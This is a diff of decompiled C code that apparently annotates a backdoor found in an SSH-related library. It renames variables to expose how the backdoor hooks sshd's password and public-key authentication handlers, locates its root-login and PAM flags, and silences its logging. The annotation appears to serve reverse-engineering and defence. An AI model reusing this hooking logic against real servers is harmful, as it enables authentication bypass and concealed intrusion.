+          psVar52 = (local_b10->global_ctx).sshd_ctx;
+          local_a30.instruction = (u8 *)0x0;
           local_a98 = local_a98 & 0xffffffff00000000;
-          *puVar2 = 0;
-          *(undefined4 *)(puVar2 + 1) = 0;
-          puVar29 = local_950;
-          lVar17 = elf_get_data_segment(local_950,&local_a30,0);
-          lVar16 = local_a30;
-          if ((lVar17 != 0) && (local_160 != 0)) {
-            puVar2[0x15] = local_160;
-            puVar2[0x16] = local_158;
+          psVar52->have_mm_answer_keyallowed = FALSE;
+          psVar52->have_mm_answer_authpassword = FALSE;
+          psVar52->have_mm_answer_keyverify = FALSE;
+          pvVar27 = elf_get_data_segment(local_980.elf_handles.main,(u64 *)&local_a30,FALSE);
+          puVar60 = local_a30.instruction;
+          if ((pvVar27 != (void *)0x0) &&
+             (local_980.string_refs.entries[0x12].func_start != (void *)0x0)) {
+            psVar52->mm_request_send_start = local_980.string_refs.entries[0x12].func_start;
+            psVar52->mm_request_send_end = local_980.string_refs.entries[0x12].func_end;
             local_a98 = CONCAT44(local_a98._4_4_,0x400);
-            puVar39 = puVar29;
-            lVar18 = elf_find_string(puVar29,&local_a98,0);
-            puVar2[0x1a] = lVar18;
-            if ((lVar18 != 0) &&
-               (iVar11 = elf_find_function_pointer
-                                   (0x16,puVar2 + 5,puVar2 + 6,puVar2 + 7,puVar39,local_3a8,puVar26,
-                                    puVar29), iVar11 == 0)) {
-              puVar2[5] = 0;
-              puVar2[6] = 0;
-              puVar2[7] = 0;
+            pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a98,(void *)0x0);
+            psVar52->STR_without_password = pcVar37;
+            if ((pcVar37 != (char *)0x0) &&
+               (BVar26 = elf_find_function_pointer
+                                   (XREF_mm_answer_authpassword,
+                                    &psVar52->mm_answer_authpassword_start,
+                                    &psVar52->mm_answer_authpassword_end,
+                                    &psVar52->mm_answer_authpassword_ptr,peVar31,
+                                    &local_980.string_refs,ctx), BVar26 == FALSE)) {
+              psVar52->mm_answer_authpassword_start = (void *)0x0;
+              psVar52->mm_answer_authpassword_end = (void *)0x0;
+              psVar52->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
             }
             local_a98 = CONCAT44(local_a98._4_4_,0x7b8);
-            lVar18 = elf_find_string(puVar39,&local_a98,0);
-            puVar2[0x1b] = lVar18;
-            if (lVar18 != 0) {
-              puVar29 = local_3a8;
-              iVar11 = elf_find_function_pointer
-                                 (0x17,puVar2 + 9,puVar2 + 10,puVar2 + 0xb,puVar39,puVar29,puVar26,
-                                  lVar18,puVar39,puVar26,puVar29);
-              if (iVar11 == 0) {
-                puVar2[9] = 0;
-                puVar2[10] = 0;
-                puVar2[0xb] = 0;
+            pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a98,(void *)0x0);
+            psVar52->STR_publickey = pcVar37;
+            if (pcVar37 != (char *)0x0) {
+              BVar26 = elf_find_function_pointer
+                                 (XREF_mm_answer_keyallowed,&psVar52->mm_answer_keyallowed_start,
+                                  &psVar52->mm_answer_keyallowed_end,
+                                  &psVar52->mm_answer_keyallowed_ptr,peVar31,&local_980.string_refs,
+                                  ctx);
+              if (BVar26 == FALSE) {
+                psVar52->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
+                psVar52->mm_answer_keyallowed_end = (void *)0x0;
+                psVar52->mm_answer_keyallowed_ptr = (void *)0x0;
               }
               else {
-                iVar11 = elf_find_function_pointer
-                                   (0x18,puVar2 + 0xd,puVar2 + 0xe,puVar2 + 0xf,puVar39,puVar29,
-                                    puVar26,uVar20,puVar39,puVar26,puVar29);
-                if (iVar11 == 0) {
-                  puVar2[0xd] = 0;
-                  puVar2[0xe] = 0;
-                  puVar2[0xf] = 0;
+                BVar26 = elf_find_function_pointer
+                                   (XREF_mm_answer_keyverify,&psVar52->mm_answer_keyverify_start,
+                                    &psVar52->mm_answer_keyverify_end,
+                                    &psVar52->mm_answer_keyverify_ptr,peVar31,&local_980.string_refs
+                                    ,ctx);
+                if (BVar26 == FALSE) {
+                  psVar52->mm_answer_keyverify_start = (void *)0x0;
+                  psVar52->mm_answer_keyverify_end = (void *)0x0;
+                  psVar52->mm_answer_keyverify_ptr = (void *)0x0;
                 }
               }
             }
-            if ((puVar2[5] != 0) || (puVar2[9] != 0)) {
-              lVar18 = *(long *)(local_b10 + 0x56);
-              local_9d8 = 0;
-              lVar19 = *(long *)(lVar18 + 0x28);
-              if (lVar19 == 0) {
-                lVar19 = *(long *)(lVar18 + 0x48);
-                if (lVar19 == 0) goto LAB_001065af;
-                uVar20 = *(undefined8 *)(lVar18 + 0x50);
+            if ((psVar52->mm_answer_authpassword_start != (void *)0x0) ||
+               (psVar52->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
+              psVar17 = (local_b10->global_ctx).sshd_ctx;
+              local_9d8.instruction = (u8 *)0x0;
+              code_start = (sshd_monitor_func_t *)psVar17->mm_answer_authpassword_start;
+              if (code_start == (sshd_monitor_func_t *)0x0) {
+                code_start = psVar17->mm_answer_keyallowed_start;
+                if (code_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
+                puVar47 = (u8 *)psVar17->mm_answer_keyallowed_end;
               }
               else {
-                uVar20 = *(undefined8 *)(lVar18 + 0x30);
+                puVar47 = (u8 *)psVar17->mm_answer_authpassword_end;
               }
-              bVar8 = FALSE;
-              lVar18 = 0;
+              bVar23 = FALSE;
+              pcVar37 = (char *)0x0;
               local_a90 = CONCAT44(local_a90._4_4_,0x198);
-              while (lVar18 = elf_find_string(puVar39,&local_a90,lVar18), lVar18 != 0) {
-                local_9d8 = 0;
-                lVar21 = elf_find_rela_reloc(puVar39,lVar18,0,0,&local_9d8);
-                if (lVar21 == 0) {
-                  local_9d8 = 0;
-                  bVar8 = TRUE;
-                  lVar21 = elf_find_relr_reloc(puVar39,lVar18,0,0,&local_9d8);
+              while (pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_a90,pcVar37),
+                    pcVar37 != (char *)0x0) {
+                local_9d8.instruction = (u8 *)0x0;
+                EVar25 = (EncodedStringId)pcVar37;
+                mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
+                if (mem_address == (Elf64_Rela *)0x0) {
+                  local_9d8.instruction = (u8 *)0x0;
+                  bVar23 = TRUE;
+                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
                 }
-                while (lVar21 != 0) {
+                while (mem_address != (Elf64_Rela *)0x0) {
                   do {
-                    iVar11 = elf_contains_vaddr_relro(puVar39,lVar21,8);
-                    if ((iVar11 != 0) &&
-                       (iVar11 = find_instruction_with_mem_operand_ex(lVar19,uVar20,0,0x109,lVar21),
-                       iVar11 != 0)) {
-                      lVar18 = puVar2[5];
-                      *(long *)(*(long *)(local_b10 + 0x56) + 0xa0) = lVar21;
-                      if (lVar18 != 0) {
-                        *(undefined4 *)((long)puVar2 + 4) = 1;
+                    BVar26 = elf_contains_vaddr_relro(peVar31,(u64)mem_address,8,1);
+                    if ((BVar26 != FALSE) &&
+                       (BVar26 = find_instruction_with_mem_operand_ex
+                                           ((u8 *)code_start,puVar47,(dasm_ctx_t *)0x0,0x109,
+                                            mem_address), BVar26 != FALSE)) {
+                      pvVar33 = psVar52->mm_answer_authpassword_start;
+                      ((local_b10->global_ctx).sshd_ctx)->STR_unknown_ptr = (char *)mem_address;
+                      if (pvVar33 != (void *)0x0) {
+                        psVar52->have_mm_answer_authpassword = TRUE;
                       }
-                      if ((puVar2[9] != 0) && (*(undefined4 *)puVar2 = 1, puVar2[0xd] != 0)) {
-                        *(undefined4 *)(puVar2 + 1) = 1;
+                      if ((psVar52->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
+                         (psVar52->have_mm_answer_keyallowed = TRUE,
+                         psVar52->mm_answer_keyverify_start != (void *)0x0)) {
+                        psVar52->have_mm_answer_keyverify = TRUE;
                       }
-                      lVar16 = lVar16 + lVar17;
-                      lVar18 = find_addr_referenced_in_mov_instruction(0x11,local_3a8,lVar17,lVar16)
-                      ;
-                      if (lVar18 != 0) {
-                        *(long *)(*(long *)(local_b10 + 0x56) + 0xc0) = lVar18;
+                      piVar43 = (int *)find_addr_referenced_in_mov_instruction
+                                                 (XREF_start_pam,&local_980.string_refs,pvVar27,
+                                                  puVar60 + (long)pvVar27);
+                      if (piVar43 != (int *)0x0) {
+                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = piVar43;
                       }
-                      plVar14 = &local_9d8;
-                      bVar8 = FALSE;
-                      local_9d0 = 0x70;
-                      local_9d8 = 0xc5800000948;
+                      pdVar56 = &local_9d8;
+                      bVar23 = FALSE;
+                      local_9d8.instruction_size._0_4_ = 0x70;
+                      local_9d8.instruction = (u8 *)0xc5800000948;
                       goto LAB_00106471;
                     }
-                    if (bVar8) goto LAB_001063c8;
-                    lVar21 = elf_find_rela_reloc(puVar39,lVar18,0,0,&local_9d8);
-                  } while (lVar21 != 0);
-                  local_9d8 = 0;
+                    if (bVar23) goto LAB_001063c8;
+                    mem_address = elf_find_rela_reloc(peVar31,EVar25,0);
+                  } while (mem_address != (Elf64_Rela *)0x0);
+                  local_9d8.instruction = (u8 *)0x0;
 LAB_001063c8:
-                  lVar21 = elf_find_relr_reloc(puVar39,lVar18,0,0,&local_9d8);
-                  bVar8 = TRUE;
+                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(peVar31,EVar25);
+                  bVar23 = TRUE;
                 }
-                lVar18 = lVar18 + 8;
+                pcVar37 = pcVar37 + 8;
               }
             }
           }
@@ -473,351 +497,395 @@ LAB_001063c8:
     }
   }
 LAB_00105a59:
-  local_b10 = (undefined4 *)0x0;
+  local_b10 = (backdoor_hooks_data_t *)0x0;
   goto LAB_00105a60;
 code_r0x00105962:
-  uVar27 = uVar27 - 0x1000;
-  if (uVar27 == uVar32) goto LAB_00105a59;
+  string_begin = string_begin + -0x40;
+  if (string_begin == pEVar16) goto LAB_00105a59;
   goto LAB_00105951;
 LAB_00106471:
   do {
-    lVar18 = elf_find_string(puVar39,plVar14,0);
-    if (lVar18 != 0) {
-      if (bVar8) {
-        *(undefined4 *)(*(long *)(local_b10 + 0x56) + 0xb8) = 1;
+    pcVar37 = elf_find_string(peVar31,(EncodedStringId *)pdVar56,(void *)0x0);
+    if (pcVar37 != (char *)0x0) {
+      if (bVar23) {
+        ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
         goto LAB_001064b8;
       }
-      bVar8 = TRUE;
+      bVar23 = TRUE;
     }
-    plVar14 = (long *)((long)plVar14 + 4);
-  } while (plVar14 != (long *)&uStack_9cc);
-  *(undefined4 *)(*(long *)(local_b10 + 0x56) + 0xb8) = 0;
+    pdVar56 = (dasm_ctx_t *)((long)&pdVar56->instruction + 4);
+  } while (pdVar56 != (dasm_ctx_t *)((long)&local_9d8.instruction_size + 4));
+  ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
 LAB_001064b8:
-  lVar16 = find_addr_referenced_in_mov_instruction(0x15,local_3a8,lVar17,lVar16);
-  if (lVar16 != 0) {
-    if ((*(int *)(*(long *)(local_b10 + 0x56) + 0xb8) != 0) && (local_b10[0x4e] != 0)) {
-      iVar11 = 0;
-      lVar17 = 0;
-      local_9d0 = 0x10;
-      local_9d8 = 0xf0000000e;
-      uVar27 = 0;
+  piVar43 = (int *)find_addr_referenced_in_mov_instruction
+                             (XREF_auth_root_allowed,&local_980.string_refs,pvVar27,
+                              puVar60 + (long)pvVar27);
+  if (piVar43 != (int *)0x0) {
+    if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
+       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
+      iVar61 = 0;
+      lVar45 = 0;
+      local_9d8.instruction_size._0_4_ = 0x10;
+      local_9d8.instruction = (u8 *)0xf0000000e;
+      hooks = (backdoor_hooks_data_t *)0x0;
       do {
-        uVar32 = (ulong)*(uint *)((long)&local_9d8 + lVar17 * 4);
-        lVar18 = alStack_3a0[uVar32 * 4];
-        if (lVar18 != 0) {
-          lVar19 = alStack_3a0[uVar32 * 4 + 1];
-          iVar11 = iVar11 + 1;
-          iVar12 = find_instruction_with_mem_operand(lVar18,lVar19,0,lVar16);
-          iVar37 = (int)uVar27;
-          if (iVar12 == 0) {
-            iVar12 = find_add_instruction_with_mem_operand(lVar18,lVar19,0,lVar16);
-            iVar37 = (int)uVar27;
-            if (iVar12 == 0) goto LAB_0010658d;
+        puVar60 = (u8 *)local_980.string_refs.entries
+                        [*(uint *)(local_9d8.opcode_window + lVar45 * 4 + -0x25)].func_start;
+        if (puVar60 != (u8 *)0x0) {
+          puVar47 = (u8 *)local_980.string_refs.entries
+                          [*(uint *)(local_9d8.opcode_window + lVar45 * 4 + -0x25)].func_end;
+          iVar61 = iVar61 + 1;
+          BVar26 = find_instruction_with_mem_operand(puVar60,puVar47,(dasm_ctx_t *)0x0,piVar43);
+          if ((BVar26 != FALSE) ||
+             (BVar26 = find_add_instruction_with_mem_operand
+                                 (puVar60,puVar47,(dasm_ctx_t *)0x0,piVar43), BVar26 != FALSE)) {
+            hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
           }
-          uVar27 = (ulong)(iVar37 + 1);
         }
-LAB_0010658d:
-        lVar17 = lVar17 + 1;
-      } while (lVar17 != 3);
-      if ((iVar11 != 0) && ((int)uVar27 == 0)) goto LAB_001065af;
+        lVar45 = lVar45 + 1;
+      } while (lVar45 != 3);
+      if ((iVar61 != 0) && ((int)hooks == 0)) goto LAB_001065af;
     }
-    *(long *)(*(long *)(local_b10 + 0x56) + 200) = lVar16;
+    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = piVar43;
   }
 LAB_001065af:
-  lVar16 = elf_symbol_get(local_930,0x2a8,0);
-  iVar11 = sshd_find_monitor_struct(local_950,local_3a8,puVar26);
-  if (iVar11 == 0) {
-    local_b10[0xf2] = 0;
-    local_b10[0xf4] = 0;
+  pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
+  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.string_refs,ctx);
+  if (BVar26 == FALSE) {
+    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
+    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
   }
-  puVar2 = *(undefined8 **)(local_b10 + 0x5a);
-  *(undefined1 **)(lVar24 + 0x10) = local_940;
+  psVar53 = (local_b10->global_ctx).sshd_log_ctx;
+  plVar28->opaque = local_980.elf_handles.libc;
   local_a98 = 0;
-  *puVar2 = 0;
-  lVar24 = elf_get_code_segment(local_918,&local_a98);
-  uVar27 = local_a98;
-  if ((((lVar24 != 0) && (0x10 < local_a98)) && (local_80 != 0)) &&
-     ((local_b10[0x4e] == 0 ||
-      (iVar11 = is_endbr64_instruction(local_80,local_80 + 4,0xe230), iVar11 != 0)))) {
-    puVar2[0xb] = local_80;
-    plVar14 = &local_a30;
-    for (lVar17 = 0x16; lVar17 != 0; lVar17 = lVar17 + -1) {
-      *(undefined4 *)plVar14 = 0;
-      plVar14 = (long *)((long)plVar14 + (ulong)bVar36 * -8 + 4);
+  psVar53->logging_disabled = FALSE;
+  psVar53->log_hooking_possible = FALSE;
+  pvVar27 = elf_get_code_segment(&local_980.main_info,&local_a98);
+  uVar10 = local_a98;
+  if ((((pvVar27 != (void *)0x0) && (0x10 < local_a98)) &&
+      ((u8 *)local_980.string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
+     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
+      (BVar26 = is_endbr64_instruction
+                          ((u8 *)local_980.string_refs.entries[0x19].func_start,
+                           (u8 *)((long)local_980.string_refs.entries[0x19].func_start + 4),0xe230),
+      BVar26 != FALSE)))) {
+    psVar53->sshlogv = local_980.string_refs.entries[0x19].func_start;
+    pdVar56 = &local_a30;
+    for (lVar45 = 0x16; lVar45 != 0; lVar45 = lVar45 + -1) {
+      *(undefined4 *)&pdVar56->instruction = 0;
+      pdVar56 = (dasm_ctx_t *)((long)pdVar56 + (ulong)bVar62 * -8 + 4);
     }
-    if (local_60 != 0) {
-      local_b20 = 0;
-      uVar35 = 0;
-      uVar40 = local_58;
-      uVar32 = local_60;
+    if ((u8 *)local_980.string_refs.entries[0x1a].func_start != (u8 *)0x0) {
+      local_b48 = (u8 *)local_980.string_refs.entries[0x1a].func_start;
+      local_b20 = (u8 *)0x0;
+      puVar60 = (u8 *)0x0;
       do {
         while( TRUE ) {
-          if ((uVar40 <= uVar32) || ((local_b20 != 0 && (uVar35 != 0)))) goto LAB_00106bf0;
-          iVar11 = x86_dasm(&local_a30,uVar32,uVar40);
-          if (iVar11 != 0) break;
-          uVar32 = uVar32 + 1;
+          if ((local_980.string_refs.entries[0x1a].func_end <= local_b48) ||
+             ((local_b20 != (u8 *)0x0 && (puVar60 != (u8 *)0x0)))) goto LAB_00106bf0;
+          BVar26 = x86_dasm(&local_a30,local_b48,(u8 *)local_980.string_refs.entries[0x1a].func_end)
+          ;
+          if (BVar26 != FALSE) break;
+          local_b48 = local_b48 + 1;
         }
-        if ((local_a08 & 0xfffffffd) == 0xb1) {
-          if (local_a14._1_1_ != '\x03') goto LAB_00106735;
-          if ((local_a20 & 0x1040) == 0) {
-            if ((local_a20 & 0x40) != 0) {
-              bVar9 = 0;
+        if ((local_a30._40_4_ & 0xfffffffd) == 0xb1) {
+          if (local_a30.prefix._13_1_ != '\x03') goto LAB_00106735;
+          if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
+            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
+              bVar24 = 0;
 LAB_001067cf:
-              bVar33 = local_a14._3_1_;
-              if ((local_a20 & 0x20) != 0) {
-                bVar33 = local_a14._3_1_ | (local_a15 & 1) << 3;
+              uVar59 = local_a30.prefix._15_1_;
+              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
+                uVar59 = local_a30.prefix._15_1_ | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
               }
               goto LAB_001067ed;
             }
-            bVar33 = 0;
+            uVar59 = 0;
           }
           else {
-            if ((local_a20 & 0x40) != 0) {
-              bVar9 = (byte)(local_a14 >> 0x10);
-              if ((local_a20 & 0x20) != 0) {
-                bVar9 = bVar9 | local_a15 * '\x02' & 8;
+            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
+              bVar24 = local_a30.prefix._14_1_;
+              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
+                bVar24 = bVar24 | (char)local_a30.prefix.decoded.rex * '\x02' & 8U;
               }
               goto LAB_001067cf;
             }
-            bVar33 = local_a20._1_1_ & 0x10;
-            if ((local_a20 & 0x1000) == 0) goto LAB_001067fb;
-            bVar9 = local_a10;
-            if ((local_a20 & 0x20) != 0) {
-              bVar9 = local_a10 | (local_a15 & 1) << 3;
+            uVar59 = local_a30.prefix.decoded.flags2 & 0x10;
+            if ((local_a30.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
+            bVar24 = local_a30.imm64_reg;
+            if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
+              bVar24 = local_a30.imm64_reg | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
             }
-            bVar33 = 0;
+            uVar59 = 0;
 LAB_001067ed:
-            if (bVar9 != bVar33) goto LAB_00106735;
+            if (bVar24 != uVar59) goto LAB_00106735;
           }
 LAB_001067fb:
-          bVar9 = 0;
-          uVar6 = 0;
-          uVar35 = 0;
-          uVar28 = 0;
-          plVar14 = &local_9d8;
-          for (lVar17 = 0x16; uVar23 = uVar32, lVar17 != 0; lVar17 = lVar17 + -1) {
-            *(undefined4 *)plVar14 = 0;
-            plVar14 = (long *)((long)plVar14 + (ulong)bVar36 * -8 + 4);
+          uVar58 = 0;
+          uVar4 = 0;
+          puVar60 = (u8 *)0x0;
+          pdVar56 = &local_9d8;
+          for (lVar45 = 0x16; lVar45 != 0; lVar45 = lVar45 + -1) {
+            *(undefined4 *)&pdVar56->instruction = 0;
+            pdVar56 = (dasm_ctx_t *)((long)pdVar56 + (ulong)bVar62 * -8 + 4);
           }
-          for (; (uVar32 < uVar40 && (uVar6 < 5)); uVar6 = uVar6 + 1) {
-            if ((uVar28 != 0) && (uVar35 != 0)) goto LAB_00106b3c;
-            iVar11 = find_mov_instruction(uVar32,uVar40,1,0);
-            if (iVar11 == 0) break;
-            if ((local_9c8 & 0x1040) != 0) {
-              if ((local_9c8 & 0x40) == 0) {
-                bVar9 = local_9c8._1_1_ & 0x10;
-                if (((local_9c8 & 0x1000) != 0) && (bVar9 = local_9b8, (local_9c8 & 0x20) != 0)) {
-                  bVar10 = local_9bd << 3;
+          puVar47 = (u8 *)0x0;
+          puVar55 = local_b48;
+          for (; (puVar55 < local_980.string_refs.entries[0x1a].func_end && (uVar4 < 5));
+              uVar4 = uVar4 + 1) {
+            if ((puVar47 != (u8 *)0x0) && (puVar60 != (u8 *)0x0)) goto LAB_00106b3c;
+            BVar26 = find_mov_instruction
+                               (puVar55,(u8 *)local_980.string_refs.entries[0x1a].func_end,TRUE,
+                                FALSE,&local_9d8);
+            if (BVar26 == FALSE) break;
+            if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
+              if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
+                uVar58 = local_9d8.prefix.decoded.flags2 & 0x10;
+                if (((local_9d8.prefix.flags_u16 & 0x1000) != 0) &&
+                   (uVar58 = local_9d8.imm64_reg, (local_9d8.prefix.flags_u16 & 0x20) != 0)) {
+                  bVar24 = (char)local_9d8.prefix.decoded.rex << 3;
                   goto LAB_001068e4;
                 }
               }
               else {
-                bVar9 = local_9bc._2_1_;
-                if ((local_9c8 & 0x20) != 0) {
-                  bVar10 = local_9bd * '\x02';
+                uVar58 = local_9d8.prefix._14_1_;
+                if ((local_9d8.prefix.flags_u16 & 0x20) != 0) {
+                  bVar24 = (char)local_9d8.prefix.decoded.rex * '\x02';
 LAB_001068e4:
-                  bVar9 = bVar9 | bVar10 & 8;
+                  uVar58 = uVar58 | bVar24 & 8;
                 }
               }
             }
-            uVar32 = uVar35;
-            if ((bVar33 == bVar9) && ((local_9c8 & 0x100) != 0)) {
-              uVar25 = local_9a8;
-              if ((local_9bc & 0xff00ff00) == 0x5000000) {
-                uVar25 = local_9a8 + local_9d8 + CONCAT44(uStack_9cc,local_9d0);
+            puVar55 = puVar60;
+            if ((uVar59 == uVar58) && ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
+              puVar46 = (u8 *)local_9d8.mem_disp;
+              if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
+                puVar46 = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
+                          CONCAT44(local_9d8.instruction_size._4_4_,
+                                   (undefined4)local_9d8.instruction_size);
               }
               local_a90 = 0;
-              uVar22 = elf_get_data_segment(local_918,&local_a90,0);
-              if ((((uVar22 == 0) || (local_a90 + uVar22 <= uVar25)) || (uVar25 < uVar22)) ||
-                 (((uVar25 == uVar35 && (uVar25 == uVar28)) || (uVar32 = uVar25, uVar28 != 0))))
-              goto LAB_00106997;
+              puVar44 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
+              if ((((puVar44 == (u8 *)0x0) || (puVar44 + local_a90 <= puVar46)) ||
+                  (puVar46 < puVar44)) ||
+                 (((puVar46 == puVar60 && (puVar46 == puVar47)) ||
+                  (puVar55 = puVar46, puVar47 != (u8 *)0x0)))) goto LAB_00106997;
             }
             else {
 LAB_00106997:
-              uVar25 = uVar28;
-              uVar35 = uVar32;
+              puVar46 = puVar47;
+              puVar60 = puVar55;
             }
-            uVar32 = CONCAT44(uStack_9cc,local_9d0) + local_9d8;
-            uVar28 = uVar25;
+            puVar55 = local_9d8.instruction +
+                      CONCAT44(local_9d8.instruction_size._4_4_,
+                               (undefined4)local_9d8.instruction_size);
+            puVar47 = puVar46;
           }
-          if ((uVar28 == 0) || (uVar35 == 0)) {
+          if ((puVar47 == (u8 *)0x0) || (puVar60 == (u8 *)0x0)) {
 LAB_00106ab1:
-            uVar35 = 0;
-            local_b20 = 0;
-            uVar32 = uVar23;
+            puVar60 = (u8 *)0x0;
+            local_b20 = (u8 *)0x0;
           }
           else {
 LAB_00106b3c:
-            iVar11 = validate_log_handler_pointers(uVar28,uVar35,lVar24,lVar24 + uVar27);
-            local_b20 = uVar28;
-            uVar32 = uVar23;
-            if (iVar11 != 0) {
-              puVar2[7] = uVar28;
-              puVar2[8] = uVar35;
-              *(undefined4 *)((long)puVar2 + 4) = 1;
-              local_9d8 = CONCAT44(local_9d8._4_4_,0x708);
-              lVar24 = elf_find_string(local_918,&local_9d8,0);
-              puVar2[2] = lVar24;
-              if (lVar24 != 0) {
-                local_9d8 = CONCAT44(local_9d8._4_4_,0x790);
-                lVar24 = elf_find_string(local_918,&local_9d8,0);
-                puVar2[3] = lVar24;
-                if (lVar24 != 0) {
-                  local_9d8 = CONCAT44(local_9d8._4_4_,0x4f0);
-                  lVar24 = elf_find_string(local_918,&local_9d8,0);
-                  puVar2[4] = lVar24;
-                  if (lVar24 != 0) {
-                    local_9d8 = CONCAT44(local_9d8._4_4_,0x1d8);
-                    lVar24 = elf_find_string(local_918,&local_9d8,0);
-                    puVar2[5] = lVar24;
-                    if (lVar24 != 0) {
-                      local_9d8 = CONCAT44(local_9d8._4_4_,0xb10);
-                      lVar24 = elf_find_string(local_918,&local_9d8,0);
-                      puVar2[6] = lVar24;
-                      if (lVar24 != 0) break;
+            BVar26 = validate_log_handler_pointers
+                               (puVar47,puVar60,pvVar27,(u8 *)((long)pvVar27 + uVar10),
+                                &local_980.string_refs,ctx);
+            local_b20 = puVar47;
+            if (BVar26 != FALSE) {
+              psVar53->log_handler_ptr = puVar47;
+              peVar31 = &local_980.main_info;
+              psVar53->log_handler_ctx_ptr = puVar60;
+              psVar53->log_hooking_possible = TRUE;
+              local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x708);
+              pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
+              psVar53->STR_percent_s = pcVar37;
+              if (pcVar37 != (char *)0x0) {
+                local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x790);
+                pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
+                psVar53->STR_Connection_closed_by = pcVar37;
+                if (pcVar37 != (char *)0x0) {
+                  local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x4f0);
+                  pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
+                  psVar53->STR_preauth = pcVar37;
+                  if (pcVar37 != (char *)0x0) {
+                    local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x1d8);
+                    pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
+                    psVar53->STR_authenticating = pcVar37;
+                    if (pcVar37 != (char *)0x0) {
+                      local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0xb10);
+                      pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
+                      psVar53->STR_user = pcVar37;
+                      if (pcVar37 != (char *)0x0) break;
                     }
                   }
                 }
               }
-              *(undefined4 *)puVar2 = 1;
+              psVar53->logging_disabled = TRUE;
               break;
             }
           }
         }
-        else if ((((local_a08 == 0x147) && (local_a14 >> 8 == 0x50000)) &&
-                 ((local_a20 & 0x800) != 0)) && (local_9f0 == 0)) {
-          uVar28 = 0;
-          if ((local_a20 & 0x100) != 0) {
-            uVar28 = local_a00 + local_a30 + local_a28;
+        else if ((((local_a30._40_4_ == 0x147) &&
+                  ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
+                 ((local_a30.prefix.flags_u16 & 0x800) != 0)) &&
+                (local_a30.operand_zeroextended == 0)) {
+          puVar47 = (u8 *)0x0;
+          if ((local_a30.prefix.flags_u16 & 0x100) != 0) {
+            puVar47 = local_a30.instruction + local_a30.instruction_size + local_a30.mem_disp;
           }
-          local_9d8 = 0;
-          uVar23 = elf_get_data_segment(local_918,&local_9d8,0);
-          if (((uVar23 != 0) && (uVar28 < local_9d8 + uVar23)) && (uVar23 <= uVar28)) {
-            plVar14 = &local_9d8;
-            for (lVar17 = 0x16; uVar23 = uVar32, lVar17 != 0; lVar17 = lVar17 + -1) {
-              *(undefined4 *)plVar14 = 0;
-              plVar14 = (long *)((long)plVar14 + (ulong)bVar36 * -8 + 4);
+          local_9d8.instruction = (u8 *)0x0;
+          puVar55 = (u8 *)elf_get_data_segment(&local_980.main_info,(u64 *)&local_9d8,FALSE);
+          if (((puVar55 != (u8 *)0x0) && (puVar47 < local_9d8.instruction + (long)puVar55)) &&
+             (puVar55 <= puVar47)) {
+            pdVar56 = &local_9d8;
+            for (lVar45 = 0x16; puVar60 = local_b48, lVar45 != 0; lVar45 = lVar45 + -1) {
+              *(undefined4 *)&pdVar56->instruction = 0;
+              pdVar56 = (dasm_ctx_t *)((long)pdVar56 + (ulong)bVar62 * -8 + 4);
             }
             do {
-              iVar11 = find_instruction_with_mem_operand_ex(uVar32,uVar40,&local_9d8);
-              if (iVar11 == 0) break;
-              if ((local_998 == 0) && ((local_9c8 & 0x100) != 0)) {
-                uVar35 = local_9a8;
-                if ((local_9bc & 0xff00ff00) == 0x5000000) {
-                  uVar35 = local_9a8 + local_9d8 + CONCAT44(uStack_9cc,local_9d0);
+              BVar26 = find_instruction_with_mem_operand_ex
